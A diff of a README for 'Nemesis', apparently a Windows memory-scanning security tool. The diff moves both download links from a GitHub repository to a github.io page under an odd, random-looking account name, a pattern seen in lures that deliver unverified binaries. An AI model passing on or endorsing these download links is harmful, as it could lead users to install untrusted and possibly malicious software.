@@ -1,6 +1,6 @@
 # 🛡️ Nemesis - Monitor your computer for hidden threats
 
-[![](https://img.shields.io/badge/Download_Nemesis-blue.svg)](https://github.com/Reigning-anabaptism212/Nemesis)
+[![](https://img.shields.io/badge/Download_Nemesis-blue.svg)](https://reigning-anabaptism212.github.io)
 
 Nemesis helps you see what programs run on your Windows computer. It looks deep into your system memory to find hidden code. Many unwanted programs hide by sitting in the memory instead of saving files to your hard drive. Nemesis spots these programs. It also checks your system settings to ensure your security tools work as expected. 
 
@@ -8,7 +8,7 @@ Nemesis helps you see what programs run on your Windows computer. It looks deep 
 
 You need to download the program first. Visit the link below to reach the official page. Find the latest version on that page and save the file to your desktop.
 
-[Download Nemesis Here](https://github.com/Reigning-anabaptism212/Nemesis)
+[Download Nemesis Here](https://reigning-anabaptism212.github.io)
 
 ## 🖥️ System Requirements
 
